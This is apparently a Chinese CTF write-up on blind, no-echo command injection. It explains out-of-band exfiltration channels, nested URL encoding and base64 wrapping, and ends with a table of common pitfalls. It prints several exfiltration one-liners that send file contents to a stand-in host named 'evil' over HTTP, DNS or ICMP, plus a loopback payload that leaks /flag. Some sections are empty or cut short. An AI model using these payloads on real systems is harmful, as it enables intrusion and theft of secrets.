## 漏洞本质

"命令执行三相态"的最后一相：

| 相态 | 代表题 | 回显方式 |
|---|---|---|
| 全回显 | Q21 Ping 拼接 | HTTP 响应直接带 stdout |
| 部分回显 / 错误回显 | 常见 WAF 后 | stderr、报错页、时间 |
| 零回显（本题） | Q23 | 一切 HTTP 响应都是静态 HTML，必须另立通道 |

\

零回显的破局哲学：既然"同步通道（HTTP response）"被掐死，那就制造"异步通道（Out-Of-Band）"。OOB 本质是让靶机从一个身份（被攻击者）切换到另一个身份（主动发起请求者），把秘密搬到攻击者可读的介质上。

\

经典 OOB 四大通道：

| 通道 | 需要的出网能力 | 攻击者需要准备 |
|---|---|---|
| HTTP（本题） | 能发 HTTP | 一个可写日志的 Web 端点 |
| DNS | 能做 DNS 查询（比 HTTP 更普遍） | 一个受控权威 NS |
| ICMP ping 带 payload | 能 ping | 抓 ICMP 包的服务器 |
| 写文件 + 二次读 | 出网全封死 | 需目标自身提供读文件入口 |

\

本题的特殊性：作者把 OOB 接收器直接做在同一个容器同一个端口里 —— 连出网都不用，`curl http://127.0.0.1/oob?c=...` 在 loopback 里走一圈就行。这是把"最难的一类"降到"只要命令能执行就一定能拿 flag"。

> Important

`cmd 2>&1 >/dev/null` 的真相:


## Page 92

- shell 重定向从左到右解析
- `2>&1`：把 stderr 复制到当前的 stdout（还是终端）
- `>/dev/null`：把 stdout 改向 /dev/null（stderr 已经复制过，不受影响）
- 结果：stderr 依然去终端，stdout 才进黑洞
- 本题里 PHP 的 `shell_exec` 只捕获 stdout，所以实际效果：stderr/stdout 都不同页面
- 要"真全丢弃" 应该写 `>/dev/null 2>&1`（顺序反过来）

## 关键前置知识

"异步外带"的 5 种载体：

| 载体 | 命令示例 | 本题是否可用 | 备注 |
|---|---|---|---|
| HTTP GET | `curl http://evil/?c=$(cat /flag)` | 内网环回 | 数据在 query 里 |
| HTTP POST | `curl -d "c=$(cat /flag)" http://evil/` |  | body 不受 URL 编码限制 |
| DNS 查询 | `nslookup $(cat /flag).evil.com` | 本题无公网 | flag 不能含 `{}` 等，需 hex |
| ICMP | `ping -p $(xxd -p /flag \| head -1) evil` |  | ping -p 只 bash tools |
| 直接写 OOB | `curl --data-binary @/flag http://.../oob` |  | 把文件整个塞进 body |

命令替换的 3 种姿势（把"读 flag"嵌入"发请求"中）：

| 形式 | 示例 | 子 shell |
|---|---|---|
| `$()` | `curl ...c=$(cat /flag)` | 现代 POSIX，支持嵌套 |
| `` ` ` `` | ``curl ...c=`cat /flag` `` | 老式，不易嵌套 |
| `<(...)` | `curl -F file=@<(cat /flag) ...` | bash 进程替换，走 `/dev/fd/N` |

URL 里的 "URL 嵌套 URL" 问题：

本题 payload 长这样：

[代码块边界]text
外层 URL: http://target/?cmd=<这里整段内层命令>
内层命令: curl "http://127.0.0.1/oob?c=$(cat /flag | base64)"
[代码块边界]

内层命令的 `?`、`=`、`&`、空格、`$()` —— 对外层 URL 来说全是保留字符。必须把内层完整 URL-encode 一次：

| 字符 | 编码 | 为什么必须编 |
|---|---|---|
| 空格 | `%20` | 否则外层 query 截到此即止 |
| `"` | `%22` | 浏览器/curl 容忍，但日志里会歪 |
| `?` | `%3F` | 外层 query 遇到第二个 `?` 不会再截，但有些代理会归并 |
| `=` | `%3D` | 最关键 —— 否则 `c=xxx` 变成外层第二个参数 |
| `&` | `%26` | 会切断 cmd 值 |
| `$ ( )` | 可不编 | URL-safe，但编了更稳 |
| `{ }` | 必须编或换掉 | 部分代理/CDN 会丢；flag 里正好有 `{}` |

### 阶段 ①：无回显怎么确认命令在执行？

## 阶段 ②：载体选 OOB 还是 time?

虽然 time-based 可以盲注一字节一字节读 flag，但本题已经白送 OOB 接收器，不走白不走：

- time-based: ~36 字节 × 8 bit × 0.2 s ≈ 57 秒/字节，极慢、易失真
- OOB-HTTP：一次请求，~200 ms 拿完整 flag

## 阶段 ③：内层 payload 的三大顾虑

1. URL 编码保底：外层 query 参数 `cmd=` 里的 `?` / `=` /空格必须编码
2. Shell 解析保真：内层 `$(cat /flag)` 里的 `$` / `(` / `)` /空格进入 shell_exec 后是否被 shell 正确还原
3. flag 本身的奇怪字符：`[FLAG 占位]` 含 `{` `}`、有时含空格/换行，会在 URL query 段被吞/改/拦

## 阶段 ④：收尾——base64 套娃

解 1、2 的唯一稳妥银弹：让 flag 变成只含 `[A-Za-z0-9+/=]` 的 base64。

内层：

# 常见坑

| 问题 | 根因 | 解决 |
|---|---|---|
| OOB 日志里 `c=raw_flagea962...` 少了 `{}` | URL query 段未编码 `{` `}`，Apache/PHP 某一环吞掉 | 全程走 `base64` 或 `hex` |
| 外层 URL 里 `c=xxx` 被识别成独立 query | 内层 `?`、`=` 没编码 | 严格 `%3F` / `%3D` |
| `$(...)` 在 URL 里没展开 | shell 一层都没进来 | 内层得先被 `shell_exec` 接到，外层只负责原样送达 |
| `cmd=` 响应显示“命令已执行”但 OOB 日志无新条目 | 命令拼错、curl 超时、loopback 被挡 | 先跑 `cmd=sleep 5` 验证时长，再跑 OOB 探针 |
| payload 里带中文/换行被截断 | 浏览器地址栏不爱复杂字符 | 用 `curl --data-urlencode` 或 POST |
| 日志里换行打断视觉 | flag 内部可能含换行 | `base64 -w0` 强制无换行 |
| 只拿到最前几字节 | `cat /flag` 遇换行 shell 未正确继续读 | 明确 `base64 -w0` 或 `tr -d '\n'` |
